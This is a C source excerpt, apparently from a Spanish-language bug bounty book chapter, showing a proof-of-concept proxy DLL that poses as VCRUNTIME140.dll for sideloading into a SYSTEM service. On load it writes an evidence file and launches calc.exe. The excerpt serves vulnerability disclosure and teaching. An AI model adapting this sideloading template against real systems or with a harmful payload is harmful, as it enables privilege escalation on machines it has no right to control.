// Extraído de: LibroBugBounty/cap-20-caso-epic.md
/**
 * Proxy DLL para VCRUNTIME140.dll
 * Se carga cuando el servicio arranca, ejecuta payload
 * en un hilo separado y retorna TRUE para no bloquear DllMain.
 */
#include <windows.h>
#include <stdio.h>

#define EVIDENCE "C:\\Users\\Public\\epic_lpe_proof.txt"

void write_evidence(void) {
    FILE *f = fopen(EVIDENCE, "w");
    if (!f) return;
    char username[256] = {0};
    DWORD usize = sizeof(username);
    GetUserNameA(username, &usize);
    fprintf(f, "Username: %s\r\n", username);
    fprintf(f, "PID:      %lu\r\n", GetCurrentProcessId());
    fprintf(f, "DLL:      VCRUNTIME140.dll (proxy)\r\n");
    fprintf(f, "Attack:   DLL sideloading in SYSTEM service\r\n");
    fclose(f);
}

DWORD WINAPI payload_thread(LPVOID lpParam) {
    Sleep(500);  /* Esperar inicializacion del proceso */
    write_evidence();
    WinExec("calc.exe", SW_SHOW);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason,
                    LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        /* Hilo separado para no bloquear el loader */
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}
